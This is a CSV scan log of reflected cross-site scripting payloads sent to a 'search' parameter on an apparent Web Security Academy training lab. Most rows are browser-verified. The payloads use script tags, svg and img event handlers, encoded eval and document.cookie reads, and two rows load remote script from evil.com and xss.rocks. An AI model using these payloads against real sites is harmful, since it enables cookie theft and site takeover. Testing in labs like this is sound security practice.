Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 14:21:20.330,2026-01-10 14:21:22.279,1.949,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:22.279,2026-01-10 14:21:22.643,0.364,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert('XSS')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:22.643,2026-01-10 14:21:23.048,0.405,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script>alert(""XSS"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:23.048,2026-01-10 14:21:23.530,0.482,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>prompt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:23.530,2026-01-10 14:21:23.883,0.352,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>confirm(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:23.883,2026-01-10 14:21:24.283,0.400,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:24.283,2026-01-10 14:21:24.637,0.355,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:24.637,2026-01-10 14:21:25.128,0.491,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(window.origin)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:25.128,2026-01-10 14:21:26.103,0.975,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script src=//xss.rocks/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 14:21:26.103,2026-01-10 14:21:30.474,4.370,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script src=https://evil.com/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 14:21:30.474,2026-01-10 14:21:30.885,0.412,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:30.885,2026-01-10 14:21:31.243,0.358,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:31.243,2026-01-10 14:21:31.686,0.443,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><script>alert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:31.686,2026-01-10 14:21:32.171,0.485,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:32.171,2026-01-10 14:21:32.652,0.481,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<svg/onload=alert(String.fromCharCode(88,83,83))>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:32.652,2026-01-10 14:21:33.131,0.479,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:33.131,2026-01-10 14:21:33.478,0.347,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:33.478,2026-01-10 14:21:33.833,0.356,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:33.833,2026-01-10 14:21:34.178,0.344,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg onload=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:34.178,2026-01-10 14:21:34.565,0.388,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:34.565,2026-01-10 14:21:35.218,0.652,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:35.218,2026-01-10 14:21:35.861,0.643,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:35.861,2026-01-10 14:21:36.651,0.790,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:36.651,2026-01-10 14:21:37.306,0.655,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=alert('XSS')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:37.306,2026-01-10 14:21:37.944,0.639,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:37.944,2026-01-10 14:21:38.575,0.631,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:38.575,2026-01-10 14:21:39.226,0.650,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=alert(document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:39.226,2026-01-10 14:21:39.757,0.532,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img/src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:39.757,2026-01-10 14:21:40.345,0.588,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<img src=""x"" onerror=""alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:21:40.345,2026-01-10 14:21:40.970,0.624,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src='x' onerror='alert(1)'>,RAW_REFLECTION,Yes,alert,Critical
